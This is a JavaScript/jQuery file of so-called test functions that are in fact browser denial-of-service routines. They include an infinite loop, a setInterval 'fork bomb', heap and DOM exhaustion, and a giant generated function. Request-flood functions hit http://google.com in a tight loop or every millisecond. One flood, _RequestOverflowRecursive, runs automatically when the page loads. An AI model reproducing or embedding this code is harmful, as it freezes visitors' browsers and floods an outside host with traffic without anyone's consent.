$(document).on('ready',function(){
	function Test1 ()
	{
		var x = 1;
		while ( ++x > 1 ) {}
	}

	function Test_ForkBomb ()
	{
		_ForkBomb();
	}

	function _ForkBomb()
	{
		setInterval(_ForkBomb, 1);
		setInterval(_ForkBomb, 1);
	}

	function Test_HeapDeath ()
	{
		(function () {
			'use strict';

			var i,
				methods = [
					'quote', 'substring', 'toLowerCase', 'toUpperCase', 'charAt',
					'charCodeAt', 'indexOf', 'lastIndexOf', 'startsWith', 'endsWith',
					'trim', 'trimLeft', 'trimRight', 'toLocaleLowerCase',
					'toLocaleUpperCase', 'localeCompare', 'match', 'search',
					'replace', 'split', 'substr', 'concat', 'slice'
				],
				methodCount = methods.length,
				assignStringGeneric = function (methodName) {
					var method = String.prototype[methodName];
					String[methodName] = function (arg1) {
						return method.apply(arg1, Array.prototype.slice.call(arguments, 1));
					};
				};

			for (i = 0; i < methodCount; i++) {
				assignStringGeneric(methods[i]);
			}
		}());
		x = '0123456789';
		for ( i = 0; i < 22; i++ ) { x = x.slice(0) + String.charCodeAt(Math.floor(Math.random() * 256)) + x.slice(0) + String.charCodeAt(Math.floor(Math.random() * 256)); }
		setInterval(_HeapDeath, 5);
	}

	function _HeapDeath ()
	{
		x = [x.slice(0) + String.charCodeAt(Math.floor(Math.random() * 256)), x.slice(0) + String.charCodeAt(Math.floor(Math.random() * 256))];
	}

	function Test_Explodabob ()
	{
		var x = 'abcdefghijklmnopqrstuvwxyz';
		for ( var i = 0; i < 21; i++ ) { x = x + x; }
		var f = new Function(x);
		f();
	}

	function Test_ElementOverflow ()
	{
		x = document.createElement('div');
		document.body.appendChild(x);
		$(x).style('display', 'none');
		_ElementOverflow();
	}

	function _ElementOverflow ()
	{
		var y;
		for ( var i = 0; i < 50; i++ )
		{
			y = document.createElement('div');
			y.className = 'element_foom';
			x.appendChild(y);
			x = y;
		}
		i = document.getElementsByTagName('div');	//	Hee, hee, hee.
		setTimeout(_ElementOverflow, 1);
	}
	function _Request(){
		$.get("http://google.com");
	}
	function _RequestOverflow() {
		while(true){
			_Request();
		}
	}
	function _RequestOverflowRecursive(){
		setInterval(_Request, 1);
	}
	function _RunAll(){
		// Test1();
		// Test_ForkBomb();
		// Test_Explodabob();
		// Test_ElementOverflow();
		// Test_HeapDeath();
		// _RequestOverflow();
		_RequestOverflowRecursive();
	}
	_RunAll();
});
